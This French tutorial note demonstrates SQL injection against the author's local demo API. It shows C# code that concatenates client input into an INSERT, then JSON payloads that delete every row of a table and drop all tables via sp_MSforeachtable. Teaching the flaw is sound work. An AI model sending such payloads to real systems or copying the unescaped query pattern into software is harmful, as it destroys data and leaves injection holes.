# 04 Injection `SQL`



## Mon attaque

Table avant attaque :

<img src="assets/before-injection-sql-oob.png" alt="before-injection-sql-oob" style="zoom:50%;" />

Code du programme :

```cs
int InsertClient(SqlConnection con, ClientDto client)
{
    var sql = $"INSERT INTO Client (nom, prenom) VALUES ('{client.Nom}', '{client.Prenom}')";
    var cmd = new SqlCommand(sql, con);

    con.Open();
    var rowsAffected = cmd.ExecuteNonQuery();

    return rowsAffected;
}
```

Les données ne sont pas échappées et directement concaténées dans la requête.

Requête `sql attack`

```http
POST https://localhost:7094/client
Content-Type: application/json

{
    "nom": "toto",
    "prenom": "Raymond');DELETE FROM Client;INSERT INTO Client (nom, prenom) VALUES('kill','kill"
}
```

contenu de la variable `sql` :

<img src="assets/sql-var-content-gty.png" alt="sql-var-content-gty" style="zoom:50%;" />

```sql
INSERT INTO Client (nom, prenom) VALUES ('toto', 'Raymond');
DELETE FROM Client;
INSERT INTO Client (nom, prenom) VALUES('kill','kill')
```

Résultat de l'attaque :

<img src="assets/after-injection-sql-cxx.png" alt="after-injection-sql-cxx" style="zoom:50%;" />



### Version hardcore

On peut aussi détruire toutes les tables :

Avant

<img src="assets/before-all-attack-table-tgq.png" alt="before-all-attack-table-tgq" style="zoom:33%;" />

Code de la requête :

```http
POST https://localhost:7094/client
Content-Type: application/json

{
    "nom": "Raymond');EXEC sp_MSforeachtable @command1 = 'DROP TABLE ?';INSERT INTO Two (b) VALUES('kill"
}
```

Requête pour détruire toutes les tables (stackoverflow : https://stackoverflow.com/questions/27606518/how-to-drop-all-tables-from-a-database-with-one-sql-query)

```sql
EXEC sp_MSforeachtable @command1 = "DROP TABLE ?"
```

Résultat :

<img src="assets/after-all-table-attack-uui.png" alt="after-all-table-attack-uui" style="zoom:50%;" />

Les tables n'existant plus, cela lève une erreur.

